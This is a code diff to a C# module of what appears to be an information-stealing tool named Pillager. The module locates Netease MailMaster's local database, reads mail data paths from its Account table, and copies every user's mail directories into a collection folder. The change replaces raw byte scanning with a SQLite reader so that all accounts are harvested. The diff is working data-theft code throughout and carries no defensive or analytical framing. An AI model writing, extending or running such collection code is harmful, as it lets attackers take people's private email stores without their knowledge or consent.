@@ -1,10 +1,7 @@
-using Microsoft.Win32;
 using Pillager.Helper;
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Text;
 
 namespace Pillager.Mails
 {
@@ -12,29 +9,26 @@ namespace Pillager.Mails
     {
         public static string MailName = "MailMaster";
 
-        private static string GetDataPath()
+        private static List<string> GetDataPath()
         {
+            List<string> strings = new List<string>();
             string sqlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data\\app.db");
-            if (!File.Exists(sqlpath)) return "";
+            if (!File.Exists(sqlpath)) return strings;
             string db_tempFile = Path.GetTempFileName();
             try
             {
                 File.Copy(sqlpath, db_tempFile, true);
-                byte[] configdb = File.ReadAllBytes(db_tempFile);
-                List<int> offsets = FindBytes(configdb, Encoding.UTF8.GetBytes("DataPath"));
-                foreach (int offset in offsets) 
+                SQLiteHandler handler = new SQLiteHandler(db_tempFile);
+                if (!handler.ReadTable("Account")) return strings;
+                for (int i = 0; i < handler.GetRowCount(); i++)
                 {
-                    if (configdb[offset + 8] != 0x20)
-                    {
-                        int size = (int)Math.Round((configdb[offset - 1] - 13L) / 2.0);
-                        byte[] bytes = configdb.Skip(offset + 8).Take(size).ToArray();
-                        return Encoding.UTF8.GetString(bytes);
-                    }
+                    string path = handler.GetValue(i, "DataPath");
+                    strings.Add(path);
                 }
             }
             catch { }
             File.Delete(db_tempFile);
-            return "";
+            return strings;
         }
 
         public static List<int> FindBytes(byte[] src, byte[] find)
@@ -61,10 +55,10 @@ namespace Pillager.Mails
             {
                 string sqlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data");
                 if (!Directory.Exists(sqlpath)) return;
-                string datapath = GetDataPath();
+                List<string> datapath = GetDataPath();
                 string savepath = Path.Combine(path, MailName);
                 Directory.CreateDirectory(savepath);
-                foreach (var directory in Directory.GetDirectories(datapath))
+                foreach (var directory in datapath)
                 {
                     Methods.CopyDirectory(directory, Path.Combine(savepath, Path.GetFileName(directory)), true);
                 }
